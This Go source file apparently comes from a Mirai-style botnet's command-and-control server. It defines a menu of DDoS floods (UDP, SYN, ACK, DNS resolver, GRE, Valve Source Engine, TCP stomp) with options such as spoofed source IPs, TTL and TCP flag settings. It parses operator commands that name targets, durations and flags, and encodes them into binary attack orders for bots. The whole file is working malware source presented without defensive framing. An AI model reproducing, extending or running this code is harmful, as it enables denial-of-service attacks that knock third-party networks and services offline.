package main

import (
    "fmt"
    "strings"
    "strconv"
    "net"
    "encoding/binary"
    "errors"
    "github.com/mattn/go-shellwords"
)

type AttackInfo struct {
    attackID            uint8
    attackFlags         []uint8
    attackDescription   string
}

type Attack struct {
    Duration    uint32
    Type        uint8
    Targets     map[uint32]uint8    // Prefix/netmask
    Flags       map[uint8]string    // key=value
}

type FlagInfo struct {
    flagID          uint8
    flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo {
    "len": FlagInfo {
        0,
        "\x1b[1;32mSize of packet data, default is 512 bytes\033[97;3m",
    },
    "rand": FlagInfo {
        1,
        "\x1b[1;32mRandomize packet content, default is 1\033[97;3m",
    },
    "tos": FlagInfo {
        2,
        "\x1b[1;32mTOS field value in header, default is 0\033[97;3m",
    },
    "ident": FlagInfo {
        3,
        "\x1b[1;32mID field value in header, default is random\033[97;3m",
    },
    "ttl": FlagInfo {
        4,
        "\x1b[1;32mTTL field in header, default is 255\033[97;3m",
    },
    "df": FlagInfo {
        5,
        "\x1b[1;32mSet the Dont-Fragment bit in header, default is 0\033[97;3m",
    },
    "sport": FlagInfo {
        6,
        "\x1b[1;32mSource port, default is rand\033[97;3m",
    },
    "dport": FlagInfo {
        7,
        "\x1b[1;32mDestination port, default is rand\033[97;3m",
    },
    "domain": FlagInfo {
        8,
        "\x1b[1;32mDomain name to attack\033[97;3m",
    },
    "dhid": FlagInfo {
        9,
        "\x1b[1;32mDomain name transaction ID, default is rand\033[97;3m",
    },
    "urg": FlagInfo {
        11,
        "\x1b[1;32mSet the URG bit in IP header, default is 0\033[97;3m",
    },
    "ack": FlagInfo {
        12,
        "\x1b[1;32mSet the ACK bit in IP header, default is 0\033[97;3m",
    },
    "psh": FlagInfo {
        13,
        "\x1b[1;32mSet the PSH bit in IP header, default is 0\033[97;3m",
    },
    "rst": FlagInfo {
        14,
        "\x1b[1;32mSet the RST bit in IP header, default is 0\033[97;3m",
    },
    "syn": FlagInfo {
        15,
        "\x1b[1;32mSet the ACK bit in IP header, default is 0\033[97;3m",
    },
    "fin": FlagInfo {
        16,
        "\x1b[1;32mSet the FIN bit in IP header, default is 0\033[97;3m",
    },
    "seqnum": FlagInfo {
        17,
        "\x1b[1;32mSequence number value in TCP header, default is rand\033[97;3m",
    },
    "acknum": FlagInfo {
        18,
        "\x1b[1;32mAck number value in TCP header, default is rand\033[97;3m",
    },
    "gcip": FlagInfo {
        19,
        "\x1b[1;32mSet internal IP to destination ip, default is 0\033[97;3m",
    },
    "method": FlagInfo {
        20,
        "\x1b[1;32mHTTP method name, default is get\033[97;3m",
    },
    "postdata": FlagInfo {
        21,
        "\x1b[1;32mPOST data, default is empty/none\033[97;3m",
    },
    "path": FlagInfo {
        22,
        "\x1b[1;32mHTTP path, default is /\033[97;3m",
    },
    /*"ssl": FlagInfo {
        23,
        "Use HTTPS/SSL"
    },
    */
    "conns": FlagInfo {
        24,
        "\x1b[1;32mNumber of connections\033[97;3m",
    },
    "source": FlagInfo {
        25,
        "\x1b[1;32mSource IP address, 255.255.255.255 for random\033[97;3m",
    },
}

var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo {
    "udp": AttackInfo {
        0,
        []uint8 { 2, 3, 4, 0, 1, 5, 6, 7, 25 },
        "UDP flood",
    },
    "vse": AttackInfo {
        1,
        []uint8 { 2, 3, 4, 5, 6, 7 },
        "Valve source engine specific flood",
    },
    "dns": AttackInfo {
        2,
        []uint8 { 2, 3, 4, 5, 6, 7, 8, 9 },
        "DNS resolver flood using the targets domain, input IP is ignored",
    },
    "syn": AttackInfo {
        3,
        []uint8 { 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "SYN flood",
    },
    "ack": AttackInfo {
        4,
        []uint8 { 0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25 },
        "ACK flood",
    },
    "stomp": AttackInfo {
        5,
        []uint8 { 0, 1, 2, 3, 4, 5, 7, 11, 12, 13, 14, 15, 16 },
        "TCP stomp flood",
    },
    "greip": AttackInfo {
        6,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE IP flood", 
    },
    "greeth": AttackInfo {
        7,
        []uint8 {0, 1, 2, 3, 4, 5, 6, 7, 19, 25},
        "GRE Ethernet flood",
    },
    "udpplain": AttackInfo {
        8,
        []uint8 {0, 1, 7},
        "UDP flood with less options. optimized for higher PPS",
    },
}

func uint8InSlice(a uint8, list []uint8) bool {
    for _, b := range list {
        if b == a {
            return true
        }
    }
    return false
}

func NewAttack(str string, admin int) (*Attack, error) {
    atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
    args, _ := shellwords.Parse(str)

    var atkInfo AttackInfo
    // Parse attack name
    if len(args) == 0 {
        return nil, errors.New("Must specify an attack name")
    } else {
        if args[0] == "?" {
            validCmdList := "\033[37;1mAvailable attack list\r\n\033[36;1m"
            for cmdName, atkInfo := range attackInfoLookup {
                validCmdList += cmdName + ": " + atkInfo.attackDescription + "\r\n"
            }
            return nil, errors.New(validCmdList)
        }
        var exists bool
        atkInfo, exists = attackInfoLookup[args[0]]
        if !exists {
            return nil, errors.New(fmt.Sprintf("The following command is not valid: \033[33;1m%s.", args[0]))
        }
        atk.Type = atkInfo.attackID
        args = args[1:]
    }

    // Parse targets
    if len(args) == 0 {
        return nil, errors.New("Must specify prefix/netmask as targets")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\x1b[1;32mPlease enter a valid IP Address.\033[97;3m (/8 and /16 are allowed)")
        }
        cidrArgs := strings.Split(args[0], ",")
        if len(cidrArgs) > 3 {
            return nil, errors.New("\x1b[1;32mCan not launch an attack on as many targets at once.\033[97;3m (3 maximum)")
        }
        for _,cidr := range cidrArgs {
            prefix := ""
            netmask := uint8(32)
            cidrInfo := strings.Split(cidr, "/")
            if len(cidrInfo) == 0 {
                return nil, errors.New("Blank target specified!")
            }
            prefix = cidrInfo[0]
            if len(cidrInfo) == 2 {
                netmaskTmp, err := strconv.Atoi(cidrInfo[1])
                if err != nil || netmask > 32 || netmask < 0 {
                    return nil, errors.New(fmt.Sprintf("\x1b[1;32mInvalid subnet supplied.\033[97;3m (near %s)", cidr))
                }
                netmask = uint8(netmaskTmp)
            } else if len(cidrInfo) > 2 {
                return nil, errors.New(fmt.Sprintf("\x1b[1;32mToo many /s supplied.\033[97;3m (near %s)", cidr))
            }

            ip := net.ParseIP(prefix)
            if ip == nil {
                return nil, errors.New(fmt.Sprintf("\x1b[1;32mFailed to resolve the IP Address.\033[97;3m (near %s)", cidr))
            }
            atk.Targets[binary.BigEndian.Uint32(ip[12:])] = netmask
        }
        args = args[1:]
    }

    // Parse attack duration time
    if len(args) == 0 {
        return nil, errors.New("\x1b[1;32mPlease enter a correct boot time.\033[97;3m (in seconds)")
    } else {
        if args[0] == "?" {
            return nil, errors.New("\x1b[1;32mPlease enter the duration of the attack.\033[97;3m (in seconds)")
        }
        duration, err := strconv.Atoi(args[0])
        if err != nil || duration == 0 || duration > 3600 {
            return nil, errors.New(fmt.Sprintf("\x1b[1;32mCan not launch an attack for %s seconds.\033[97;3m (3600 maximum)", args[0]))
        }
        atk.Duration = uint32(duration)
        args = args[1:]
    }

    // Parse flags
    for len(args) > 0 {
        if args[0] == "?" {
          validFlags := "\033[37;1mList of flags key=val seperated by spaces.\r\n"
            for _, flagID := range atkInfo.attackFlags {
                for flagName, flagInfo := range flagInfoLookup {
                    if flagID == flagInfo.flagID {
                        validFlags += flagName + ": " + flagInfo.flagDescription + "\r\n"
                        break
                    }
                }
            }

            return nil, errors.New(validFlags)
        }
        flagSplit := strings.SplitN(args[0], "=", 2)
        if len(flagSplit) != 2 {
            return nil, errors.New(fmt.Sprintf("Invalid key=value flag combination near %s", args[0]))
        }
        flagInfo, exists := flagInfoLookup[flagSplit[0]]
        if !exists || !uint8InSlice(flagInfo.flagID, atkInfo.attackFlags) || (admin == 0 && flagInfo.flagID == 25) {
            return nil, errors.New(fmt.Sprintf("Invalid flag key %s, near %s", flagSplit[0], args[0]))
        }
        if flagSplit[1][0] == '"' {
            flagSplit[1] = flagSplit[1][1:len(flagSplit[1]) - 1]
            fmt.Println(flagSplit[1])
        }
        if flagSplit[1] == "true" {
            flagSplit[1] = "1"
        } else if flagSplit[1] == "false" {
            flagSplit[1] = "0"
        }
        atk.Flags[uint8(flagInfo.flagID)] = flagSplit[1]
        args = args[1:]
    }
    if len(atk.Flags) > 255 {
        return nil, errors.New("Cannot have more than 255 flags")
    }

    return atk, nil
}

func (this *Attack) Build() ([]byte, error) {
    buf := make([]byte, 0)
    var tmp []byte

    // Add in attack duration
    tmp = make([]byte, 4)
    binary.BigEndian.PutUint32(tmp, this.Duration)
    buf = append(buf, tmp...)

    // Add in attack type
    buf = append(buf, byte(this.Type))

    // Send number of targets
    buf = append(buf, byte(len(this.Targets)))

    // Send targets
    for prefix,netmask := range this.Targets {
        tmp = make([]byte, 5)
        binary.BigEndian.PutUint32(tmp, prefix)
        tmp[4] = byte(netmask)
        buf = append(buf, tmp...)
    }

    // Send number of flags
    buf = append(buf, byte(len(this.Flags)))

    // Send flags
    for key,val := range this.Flags {
        tmp = make([]byte, 2)
        tmp[0] = key
        strbuf := []byte(val)
        if len(strbuf) > 255 {
            return nil, errors.New("Flag value cannot be more than 255 bytes!")
        }
        tmp[1] = uint8(len(strbuf))
        tmp = append(tmp, strbuf...)
        buf = append(buf, tmp...)
    }

    // Specify the total length
    if len(buf) > 4096 {
        return nil, errors.New("Max buffer is 4096")
    }
    tmp = make([]byte, 2)
    binary.BigEndian.PutUint16(tmp, uint16(len(buf) + 2))
    buf = append(tmp, buf...)

    return buf, nil
}
